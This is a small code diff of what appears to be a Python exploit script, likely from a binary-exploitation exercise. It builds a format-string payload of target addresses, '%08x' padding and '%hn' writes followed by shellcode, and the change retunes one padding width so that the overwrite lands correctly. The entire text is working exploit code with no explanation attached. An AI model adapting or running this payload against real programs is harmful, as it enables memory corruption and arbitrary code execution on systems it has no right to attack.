@@ -21,4 +21,4 @@ LENTGHOFREQUIRED = 61
 
 #print("AAAA" + str(ADDRESSTOWRITE1)[2:18] + str(ADDRESSTOWRITE2)[2:18] +  "%08x." * 320)
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%24591x' + b'%hn' + b'%25045x' +  b'%hn' + b'\n' + SHELLCODE)
+    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%24579x' + b'%hn' + b'%25045x' +  b'%hn' + b'\n' + SHELLCODE)
